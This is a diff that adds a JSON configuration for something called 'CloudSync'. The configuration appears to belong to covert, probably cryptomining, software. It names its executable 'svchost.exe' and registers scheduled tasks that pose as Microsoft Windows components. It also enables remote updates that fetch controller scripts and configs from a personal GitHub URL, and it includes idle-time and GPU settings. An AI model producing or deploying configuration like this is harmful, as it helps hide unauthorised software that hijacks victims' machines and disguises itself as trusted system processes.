@@ -1,0 +1,29 @@
+{
+    "name":  "CloudSync",
+    "version":  5,
+    "binary":  "svchost.exe",
+    "idle_seconds":  180,
+    "force_gpu":  false,
+    "remote_update":  true,
+    "legacy_update":  false,
+    "worker_tag":  "w",
+    "update_base":  "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/",
+    "tasks":  [
+                  "Microsoft\\Windows\\CloudSync\\CloudSync",
+                  "Microsoft\\Windows\\CloudSync\\CloudSyncHealth"
+              ],
+    "files":  [
+                  {
+                      "path":  "controller.py",
+                      "sha256":  "ea63051994daa3b3bf39af0c4922917d2cbfe111c4a424f2a223af101d14fc25"
+                  },
+                  {
+                      "path":  "gpudetect.py",
+                      "sha256":  "3f321124d0dbb8b311a30c7e1bbae56616c88c2da20dfc23487fd8ec7174a6b4"
+                  },
+                  {
+                      "path":  "config_high.json",
+                      "sha256":  "e31a2c5b7ce643e9907e8aa73206b08d32fa67757f60950adf12ce1ee58b0dd7"
+                  }
+              ]
+}
